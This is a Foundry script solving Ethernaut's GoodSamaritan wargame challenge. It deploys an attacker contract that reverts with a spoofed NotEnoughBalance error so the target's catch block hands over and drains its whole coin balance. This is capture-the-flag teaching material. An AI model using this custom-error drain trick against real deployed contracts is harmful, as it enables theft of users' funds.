// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/27-GoodSamaritan/Notifyable.sol";

/**
 * @title Challenge 27 Solution Script
 * @notice Deploy Notifyable that reverts with NotEnoughBalance on small donations to drain all coins
 */
contract GoodSamaritanSolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0x00381458550742927e355d61886aDA88650335b6;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        // Deploy attacker that reverts with NotEnoughBalance() on notify(10)
        // This triggers the catch block in requestDonation(), which transfers remaining balance
        Notifyable attacker = new Notifyable(INSTANCE);
        attacker.attack();
        console.log("GoodSamaritan drained via custom error exploit");

        vm.stopBroadcast();

        console.log("Challenge 27 completed!");
    }
}
